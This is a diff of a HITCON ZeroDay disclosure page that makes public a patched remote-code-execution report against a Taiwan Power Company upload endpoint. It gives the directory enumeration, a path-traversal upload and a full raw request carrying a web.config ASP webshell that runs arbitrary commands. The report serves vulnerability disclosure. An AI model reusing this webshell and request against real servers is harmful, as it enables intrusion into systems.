@@ -10246,7 +10246,7 @@
   </div>
  </section>
 </div>
-</description><pubDate>Fri, 05 Aug 2022 07:08:51 GMT</pubDate></item><item><title>[Bounty]  某單位  RCE</title><link>https://zeroday.hitcon.org/vulnerability/ZD-2022-00616</link><description><div class="container">
+</description><pubDate>Fri, 05 Aug 2022 07:08:51 GMT</pubDate></item><item><title>[Bounty] 台灣電力公司 RCE</title><link>https://zeroday.hitcon.org/vulnerability/ZD-2022-00616</link><description><div class="container">
  <h2 class="always-not-there">
   Vulnerability Detail Report
  </h2>
@@ -10264,12 +10264,25 @@
       ZD-2022-00616
      </span>
     </li>
+    <li class="vendor">
+     <a class="zdui-button send-message okgo" href="/up/message/channel/create/vendor/2577">
+      <i class="far fa-envelope">
+      </i>
+      發信
+     </a>
+     <span class="label">
+      Vendor:
+     </span>
+     <span class="value tx-overflow-ellipsis">
+      台灣電力公司
+     </span>
+    </li>
     <li class="title">
      <span class="label">
       Title:
      </span>
      <span class="value">
-      [Bounty]  某單位  RCE
+      [Bounty] 台灣電力公司 RCE
      </span>
     </li>
     <li class="intro">
@@ -10292,10 +10305,10 @@
     目前狀態
    </h4>
    <div class="status-label col-status-200-tx">
-    確認已修補
+    公開
    </div>
    <div class="status-descr">
-    Last Update : 2022/08/19
+    Last Update : 2022/08/23
    </div>
    <ul class="zdui-status-timeline stat-tn-risk-critical">
     <li class="">
@@ -10334,7 +10347,7 @@
       </span>
      </div>
     </li>
-    <li class="just-arrived">
+    <li class="">
      <div class="stat-tn-node">
       <span class="stat-tn-date">
       </span>
@@ -10343,7 +10356,7 @@
       </span>
      </div>
     </li>
-    <li class="not-arrived-yet">
+    <li class="just-arrived">
      <div class="stat-tn-node">
       <span class="stat-tn-date">
       </span>
@@ -10425,6 +10438,17 @@
       確認已修補 (由 K4iBr0 更新此狀態)
      </span>
     </li>
+    <li>
+     <span class="log-date">
+      2022/08/23 03:00:05
+     </span>
+     <span class="always-not-there">
+      :
+     </span>
+     <span class="log-status">
+      公開 (由 HITCON ZeroDay 平台自動更新)
+     </span>
+    </li>
    </ul>
   </div>
  </section>
@@ -10453,6 +10477,199 @@
    </ul>
   </div>
  </section>
+ <section class="vul-detail-section vu-d-url">
+  <h3 class="sec-title">
+   參考資料
+  </h3>
+  <div class="section-content url">
+   <div>
+    攻擊者可經由該漏洞取得主機完整權限、任意寫入檔案及取得大量內網資訊。
+    <br/>
+    <br/>
+    漏洞說明： OWASP - Code Injection
+    <br/>
+    https://www.owasp.org/index.php/Code_Injection
+    <br/>
+    <br/>
+    漏洞說明： OWASP - Command Injection
+    <br/>
+    https://www.owasp.org/index.php/Command_Injection
+    <br/>
+    <br/>
+    漏洞說明： CWE-77: Improper Neutralization of Special Elements used in a Command ('Command Injection')
+    <br/>
+    http://cwe.mitre.org/data/definitions/77.html
+    <br/>
+    <br/>
+    漏洞說明： CWE-78: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')
+    <br/>
+    http://cwe.mitre.org/data/definitions/78.html
+   </div>
+   <div align="right" class="section-content url" style="color: grey; margin-top: 20px">
+    (本欄位資訊由系統根據漏洞類別自動產生，做為漏洞參考資料。)
+   </div>
+  </div>
+ </section>
+ <section class="vul-detail-section vu-d-url">
+  <h3 class="sec-title">
+   相關網址
+  </h3>
+  <div class="section-content url">
+   <div class="urls">
+    https://ebppsmtp.taipower.com.tw/uploadfile/UploadFile.aspx
+   </div>
+  </div>
+ </section>
+ <section class="vul-detail-section">
+  <h3 class="sec-title">
+   敘述
+  </h3>
+  <div class="section-content zdui-md-content" id="detail">
+   <div>
+    <p>
+     <a href="https://ebppsmtp.taipower.com.tw/uploadfile/UploadFile.aspx">
+      https://ebppsmtp.taipower.com.tw/uploadfile/UploadFile.aspx
+     </a>
+     存在任意檔案上傳漏洞，上傳檔案之內容及路徑皆為攻擊者可控
+    </p>
+    <p>
+     由於 web 目錄不在常見路徑下，所以沒辦法直接寫入 webshell
+    </p>
+    <p>
+     但因為該路徑可以使用短文件名格式，且不存在或無法寫入之路徑會提示上傳失敗 ，所以可以簡單窮舉目錄結構:
+    </p>
+    <pre><code>- c:/var/
+  - customers
+  - delta
+  - docs
+  - downloads
+  - FolderRequest
+  - export
+  - images
+  - import
+  - list
+  - logfiles
+  - quest
+  - report
+  - temp
+  - templates
+  - update
+  - uploads
+  - users
+  - featur~1
+  - subscr~1
+  - unsubs~1
+  - return~1
+  - replym~1
+  - receiv~1</code></pre>
+    <p>
+     經過研究後發現實體路徑
+     <code>
+      c:/var/*
+     </code>
+     下的內容對應到網站路徑的
+     <code>
+      https://ebppsmtp.taipower.com.tw/var/*
+     </code>
+    </p>
+    <p>
+     由於嘗試上傳 asp / aspx / asmx 皆未被解析，故改以寫入 web.config 方式，成功取得系統控制權限
+    </p>
+    <p>
+     上傳 web.config webshell:
+     <br/>
+     <img alt="圖片" src="https://zeroday.hitcon.org/api/vulnerability/7779/attachments/f39255da32d64fa7ff1047835f57fd51"/>
+    </p>
+    <p>
+     觸發指令執行:
+     <br/>
+     <img alt="圖片" src="https://zeroday.hitcon.org/api/vulnerability/7779/attachments/dcadf1ebee2481d5933827d30211143c"/>
+    </p>
+    <p>
+     執行 ipconfig 確認該機器位於 10.X.X.X 網段
+     <br/>
+     <img alt="圖片" src="https://zeroday.hitcon.org/api/vulnerability/7779/attachments/a442ebd442c0f1b59d6b7bedb9c96085"/>
+    </p>
+    <hr/>
+    <p>
+     (重現漏洞用) 上傳 web.config webshell 之 Raw request:
+    </p>
+    <pre><code>POST /uploadfile/UploadFile.aspx HTTP/1.1
+Host: ebppsmtp.taipower.com.tw
+Cookie: ASP.NET_SessionId=g0mm3f454prtib55g5nwkj45
+Content-Length: 1354
+Origin: https://ebppsmtp.taipower.com.tw
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryv00ZBQrKTDBA8xQS
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36
+Connection: close
+
+------WebKitFormBoundaryv00ZBQrKTDBA8xQS
+Content-Disposition: form-data; name="UploadFile"; filename="hi.txt"
+Content-Type: text/plain
+
+&lt;?xml version="1.0" encoding="UTF-8"?&gt;
+&lt;configuration&gt;
+   &lt;system.webServer&gt;
+      &lt;handlers accessPolicy="Read, Script, Write"&gt;
+         &lt;add name="web_config" path="*.config" verb="*" modules="IsapiModule" scriptProcessor="%windir%\system32\inetsrv\asp.dll" resourceType="Unspecified" requireAccess="Write" preCondition="bitness64" /&gt;
+      &lt;/handlers&gt;
+      &lt;security&gt;
+         &lt;requestFiltering&gt;
+            &lt;fileExtensions&gt;
+               &lt;remove fileExtension=".config" /&gt;
+            &lt;/fileExtensions&gt;
+            &lt;hiddenSegments&gt;
+               &lt;remove segment="web.config" /&gt;
+            &lt;/hiddenSegments&gt;
+         &lt;/requestFiltering&gt;
+      &lt;/security&gt;
+   &lt;/system.webServer&gt;
+&lt;/configuration&gt;
+&lt;!--
+&lt;%
+Response.Write("-"&amp;"-&gt;")
+Function GetCommandOutput(command)
+    Set shell = CreateObject("WScript.Shell")
+    Set exec = shell.Exec(command)
+    GetCommandOutput = exec.StdOut.ReadAll
+End Function
+Response.Write(GetCommandOutput("cmd /c " + Request("cmd")))
+Response.Write("&lt;!-"&amp;"-")
+%&gt;
+--&gt;
+
+------WebKitFormBoundaryv00ZBQrKTDBA8xQS
+Content-Disposition: form-data; name="UploadFileName"
+
+../../../../../var/uploads/web.config
+------WebKitFormBoundaryv00ZBQrKTDBA8xQS--</code></pre>
+   </div>
+  </div>
+ </section>
+ <section class="vul-detail-section">
+  <h3 class="sec-title">
+   擷圖
+  </h3>
+  <div class="section-content screenshot">
+   <ul>
+    <li>
+     <span>
+      <img src="/api/vulnerability/7779/attachments/f39255da32d64fa7ff1047835f57fd51" width="320"/>
+     </span>
+    </li>
+    <li>
+     <span>
+      <img src="/api/vulnerability/7779/attachments/a442ebd442c0f1b59d6b7bedb9c96085" width="320"/>
+     </span>
+    </li>
+    <li>
+     <span>
+      <img src="/api/vulnerability/7779/attachments/dcadf1ebee2481d5933827d30211143c" width="320"/>
+     </span>
+    </li>
+   </ul>
+  </div>
+ </section>
  <section class="vul-detail-section vu-d-cmnt">
   <h3 class="sec-title">
    留言討論
@@ -10465,6 +10682,25 @@
      <a href="/auth/login">
       登入後留言
      </a>
+    </div>
+   </div>
+  </div>
+ </section>
+ <section class="vul-detail-section vu-d-cmnt">
+  <h3 class="sec-title">
+   聯絡組織
+  </h3>
+  <div class="section-content">
+   <div class="zdui-comment-block">
+    <div class="input-comment">
+     <a class="zdui-button okgo" href="/up/message/channel/create/vendor/2577">
+      <i class="far fa-envelope">
+      </i>
+      發送私人訊息
+     </a>
+     <div class="remind-text">
+      您也可以透過私人訊息的方式與組織聯繫，討論有關於這個漏洞的相關資訊。
+     </div>
     </div>
    </div>
   </div>
